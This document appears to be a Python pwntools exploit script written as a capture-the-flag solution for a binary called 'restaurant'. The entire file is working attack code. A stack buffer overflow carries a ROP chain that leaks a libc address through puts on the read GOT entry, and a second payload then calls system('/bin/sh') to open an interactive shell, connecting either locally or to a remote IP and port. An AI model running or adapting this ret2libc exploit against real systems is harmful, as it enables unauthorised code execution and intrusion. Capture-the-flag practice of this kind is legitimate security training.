#!/usr/bin/env python3

from pwn import *

exe = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
	global r

	if args.LOCAL:
		r = process([exe.path])
		if args.DDEBUG:
			gdb.attach(r)
	else:
		r = remote("94.237.53.58", 45661)

	return r


def main():
	r = conn()
	rop = ROP(exe)

	# Some useful gadgets
	pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
	ret		= rop.find_gadget(["ret"])[0]

	# TODO: FARE CON rop.call() E ALTRO
	payload  = b"A" * 40 + p64(pop_rdi) + p64(exe.got["read"]) \
				+ p64(exe.plt["puts"]) + p64(exe.symbols["main"])

	# Call fill() and send payload
	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b"> ", payload)

	# Retrieve LIBC address
	libc.address = u64(r.recvlines(2)[1][-6:].ljust(8, b"\x00")) - libc.symbols["read"]
	log.info(f"LIBC address: 0x{libc.address:x}")

	# Call "/bin/sh" through system()
	payload = b"A" * 40 + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) \
				+ p64(ret) + p64(libc.symbols["system"])

	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b"> ", payload)

	# Enjoy the shell!
	r.clean()
	r.interactive("$ ")


if __name__ == "__main__":
	main()
